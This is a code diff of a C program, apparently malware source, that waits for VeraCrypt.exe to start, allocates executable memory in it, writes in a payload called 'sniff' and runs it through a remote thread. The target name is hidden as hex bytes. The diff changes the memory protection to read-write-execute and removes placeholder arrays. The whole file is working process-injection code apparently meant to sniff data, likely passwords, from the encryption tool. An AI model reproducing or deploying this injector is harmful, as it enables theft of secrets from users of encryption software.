@@ -10,9 +10,7 @@ extern DWORD ExecuteRemoteThread64(HANDLE hTargetProc, LPVOID lpvRemotePayloadMe
 
 int main(void)
 {
-    char cProlog[] = {0xFFFFFFFFFFFF};
-
-    char cVeraCrypt[] = {0x56, 0x65, 0x72, 0x61, 0x43, 0x72, 0x79, 0x70, 0x74, 0x2e, 0x65, 0x78, 0x65, 0};
+    CHAR cVeraCrypt[] = {0x56, 0x65, 0x72, 0x61, 0x43, 0x72, 0x79, 0x70, 0x74, 0x2e, 0x65, 0x78, 0x65, 0};
 
     DWORD dwProcID = -1;
     while (1)
@@ -35,7 +33,7 @@ int main(void)
 
 #include "sniff.x64.bin.h"
 
-    LPVOID lpvRemotePayloadMem = UtilsVirtualAllocEx(hTargetProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
+    LPVOID lpvRemotePayloadMem = UtilsVirtualAllocEx(hTargetProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (lpvRemotePayloadMem == NULL)
     {
         goto shutdown;
@@ -48,17 +46,16 @@ int main(void)
 
     HANDLE hThread = NULL;
     DWORD iRetVal = ExecuteRemoteThread64(hTargetProc, lpvRemotePayloadMem, &hThread);
-
     if (hThread != NULL)
     {
         UtilsResumeThread(hThread);
     }
 
-    char cPrintString[] = {0x59, 0x6f, 0x6f, 0x68, 0x6f, 0x6f, 0x6f, 0x21, 0x21, 0x21, 0};
+    CHAR cPrintString[] = {0x59, 0x6f, 0x6f, 0x68, 0x6f, 0x6f, 0x6f, 0x21, 0x21, 0x21, 0};
     UtilsOutputDebugStringA(cPrintString);
 
 shutdown:
     UtilsCloseHandle(hTargetProc);
-    char cEpilog[] = {0xAAAAAAAAAAAAAA};
+
     return 0;
 }
